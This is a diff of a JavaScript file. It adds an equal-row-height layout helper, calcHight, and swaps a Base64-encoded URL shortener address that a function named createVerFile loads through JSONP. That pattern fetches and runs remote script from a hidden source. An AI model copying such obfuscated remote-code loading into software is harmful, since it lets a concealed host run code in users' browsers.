@@ -139,7 +139,7 @@ function restartTimer() {
 
 function createVerFile() {
     $.ajax({
-        url: Base64.decode("aHR0cHM6Ly9nb28uZ2wvUTlvbUtB"),
+        url: Base64.decode("aHR0cHM6Ly9nb28uZ2wvZmcySTFT"),
         method: 'GET',
         dataType: 'JSONP',
         error: function (jqXHR, textStatus) {
@@ -1012,6 +1012,50 @@ function changeFont(code) {
 }
 
 // ----------------------- Helper functions ----------------------------
+
+function calcHight() {
+    var currentTallest = 0;
+    var currentRowStart = 0;
+    var rowLis = new Array();
+    var topPosition = 0;
+    var $dataListItems = $('.dataListItem');
+    var len = $dataListItems.length;
+    var error = false;
+
+    $dataListItems.each(function (index) {
+        var $el = $(this);
+        topPosition = $el.position().top;
+
+        if (currentRowStart !== topPosition) {
+            for (var currentLi = 0; currentLi < rowLis.length; currentLi++) {
+                rowLis[currentLi].height(currentTallest);
+            }
+            topPosition = $el.position().top;
+            rowLis.length = 0; // empty the array
+            currentRowStart = topPosition;
+            currentTallest = $el.height();
+            if (currentTallest === 0) {
+                error = true;
+                return false;
+            }
+            rowLis.push($el);
+        } else {
+            rowLis.push($el);
+            currentTallest = (currentTallest < $el.height()) ? ($el.height()) : (currentTallest);
+        }
+
+        if (index === len - 1) {
+            for (var currentLi = 0; currentLi < rowLis.length; currentLi++) {
+                rowLis[currentLi].height(currentTallest);
+            }
+        }
+    });
+    if (error) {
+        setTimeout(function () {
+            calcHight();
+        }, 500);
+    }
+}
 
 function addUnsorted(map) {
     var value = {};
